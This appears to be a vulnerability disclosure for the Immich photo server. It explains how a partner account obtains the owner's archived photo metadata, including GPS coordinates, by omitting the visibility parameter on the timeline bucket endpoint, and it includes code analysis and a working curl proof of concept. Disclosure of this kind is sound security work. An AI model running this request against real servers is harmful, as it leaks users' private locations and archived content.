repo.description:
## Summary

i found that `GET /api/timeline/bucket` returns archived assets from the library owner to a partner account when `visibility` is omitted, a partner is supposed to receive only `timeline` assets. the response gives the archived asset id, visibility, thumbhash, GPS fields, capture time, ratio, type and live-photo linkage.

## Code analysis

i checked `timeBucketChecks()` first:

```ts
if (dto.userId) {
  await this.requireAccess({ auth, permission: Permission.TimelineRead, ids: [dto.userId] });
  if (dto.visibility === AssetVisibility.Archive) {
    await this.requireAccess({ auth, permission: Permission.ArchiveRead, ids: [dto.userId] });
  }
}
```

this is `server/src/services/timeline.service.ts:58-62`, `TimelineRead` accepts the partner user id through `server/src/utils/access.ts:265-269`, while `ArchiveRead` is self-only at `server/src/utils/access.ts:235-237`

when `dto.visibility` is undefined, `server/src/repositories/asset.repository.ts:841` uses `withDefaultVisibility`, and `server/src/utils/database.ts:82-84` adds both `archive` and `timeline` to the query

the `withPartners` path filters archived assets at `timeline.service.ts:73-84`, the direct `userId` path does not, and per-asset partner access only grants `Timeline` and `Hidden` at `server/src/repositories/access.repository.ts:201-224`

## Exploitation

i reproduced this on a live Immich v3.0.0 server with the official Postgres vectorchord image, three standard accs , miau owns the library, cha is the partner, miau67 is unrelated

miau uploads `secret.jpg` and `public.jpg`, archives `SECRET_ID`, then adds cha as a partner, after that cha sends the request below without a `visibility` parameter

## PoC

create three standard accounts through the normal signup flow, miau owns the library, cha is the partner, miau67 is unrelated, then set their ids and tokens:

```bash
~/immich ❯ B=http://host:2283/api
~/immich ❯ UA='Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'
```

upload `secret.jpg` and `public.jpg` as miau, keep the returned ids in `SECRET_ID` and `PUBLIC_ID`, archive `SECRET_ID`, then add cha as partner:

```bash
~/immich ❯ SECRET_ID=$(curl -s -A "$UA" -X POST "$B/assets" -H "Authorization: Bearer $TOK_MIAU" -F deviceAssetId=p1 -F deviceId=poc -F fileCreatedAt=2026-03-15T10:00:00.000Z -F fileModifiedAt=2026-03-15T10:00:00.000Z -F 'assetData=@secret.jpg' | jq -r .id)
~/immich ❯ PUBLIC_ID=$(curl -s -A "$UA" -X POST "$B/assets" -H "Authorization: Bearer $TOK_MIAU" -F deviceAssetId=p2 -F deviceId=poc -F fileCreatedAt=2026-03-15T11:00:00.000Z -F fileModifiedAt=2026-03-15T11:00:00.000Z -F 'assetData=@public.jpg' | jq -r .id)
~/immich ❯ curl -s -A "$UA" -X PUT "$B/assets" -H "Authorization: Bearer $TOK_MIAU" -H 'Content-Type: application/json' -d "{\"ids\":[\"$SECRET_ID\"],\"visibility\":\"archive\"}"
~/immich ❯ curl -s -A "$UA" -X POST "$B/partners" -H "Authorization: Bearer $TOK_MIAU" -H 'Content-Type: application/json' -d "{\"sharedWithId\":\"$CHA_ID\"}"
```

the vulnerable request is:

```bash
~/immich ❯ curl -s -A "$UA" "$B/timeline/bucket?timeBucket=2026-03-01&userId=$MIAU_ID&withCoordinates=true" -H "Authorization: Bearer $TOK_CHA" | jq '{id, visibility, ownerId}'
{
  "id": ["ae969c49-...", "75d2f680-..."],
  "visibility": ["timeline", "archive"],
  "ownerId": ["<MIAU_ID>", "<MIAU_ID>"]
}
```

the `archive` entry is `SECRET_ID`, and `withCoordinates=true` also returns its `thumbhash`, `city`, `country`, `latitude`, `longitude`, `fileCreatedAt`, `ratio`, `isImage`, `livePhotoVideoId` and `projectionType`

the explicit archive request is rejected:

```http
HTTP 400
{"message":"Not found or no archive.read access"}
```

the same partner cannot read the asset or thumbnail:

```http
HTTP 400
{"message":"Not found or no asset.read access"}

HTTP 400
{"message":"Not found or no asset.view access"}
```

an unrelated account is rejected by the timeline check:

```http
HTTP 400
{"message":"Not found or no timeline.read access"}
```

## Impact

any partner of a user can list that user's archived timeline metadata, including precise location and capture data, even though archive is the setting used to hide an asset from that partner
repo.summary: Immich partner reads archived timeline metadata
